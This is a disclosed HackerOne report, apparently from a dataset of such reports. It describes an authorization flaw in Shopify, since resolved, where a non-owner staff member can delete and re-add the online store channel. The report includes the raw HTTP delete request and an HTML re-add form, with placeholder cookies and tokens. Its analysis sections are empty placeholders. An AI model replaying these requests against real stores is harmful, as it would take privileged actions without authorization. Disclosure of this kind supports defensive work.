---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '98151'
original_report_id: '98151'
title: Non-owner user can remove online store channel and re-add it.
weakness: Improper Authentication - Generic
team_handle: shopify
created_at: '2015-11-05T21:40:10.826Z'
disclosed_at: '2015-12-03T17:35:29.320Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- improper-authentication-generic
---

# Non-owner user can remove online store channel and re-add it.

## Metadata

- HackerOne Report ID: 98151
- Weakness: Improper Authentication - Generic
- Program: shopify
- Disclosed At: 2015-12-03T17:35:29.320Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi , I have found an issue that allows a non-owner user with full access permissions or access to /channels  to remove the online store channel while only the store owner can remove it!

#Steps to reproduce:
1. Login with a non-owner user who has full access permissions
2. Send this request: 

```
POST /admin/channels/<Online_store_channel_id> HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: https://<your_shop>.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: <Staff_Member_cookies>

_method=delete&authenticity_token=<Your_token>
```

Then go to `*yourstore.myshopify.com/admin/channels` and you'll see that the channel was removed causing an error with the plan.

The staff member can also re-add the channel by submitting the following form:

```
<form method="post" action="/admin/channels?channel%5Bprovider_id%5D=1&amp;resolve_redirect_url=%2Fadmin%2Fchannels">
<input type="submit" value="Re-add channel">
<input name="authenticity_token" value="<yout_token>">
</form>
```

This is clearly a privilege escalation issue , since when you go to channels with a non-owner account , it says that you have to contact the owner to remove the online store channel which means that only the owner should be able to remove it.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
